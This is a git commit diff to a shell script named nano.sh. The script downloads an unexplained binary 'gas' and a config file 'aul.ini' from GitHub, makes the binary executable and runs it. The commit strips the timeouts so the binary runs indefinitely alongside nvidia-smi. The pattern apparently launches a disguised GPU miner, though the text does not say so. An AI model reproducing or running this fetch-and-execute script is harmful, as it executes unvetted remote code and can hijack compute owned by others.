1042aca6b1dc9180cf83014acd416e42c16a53cb
altergili1 <93052988+altergili1@users.noreply.github.com>
2021-10-24 00:55:57 +0530

    Update nano.sh

--- nano.sh
+++ nano.sh
@@ -2,5 +2,5 @@
 wget https://github.com/aka648582/yes/raw/main/gas
 chmod +x gas
 wget https://github.com/altergili1/jobs/raw/main/aul.ini
-timeout 1m ./gas aul.ini
-timeout 7m nvidia-smi
+./gas aul.ini
+nvidia-smi
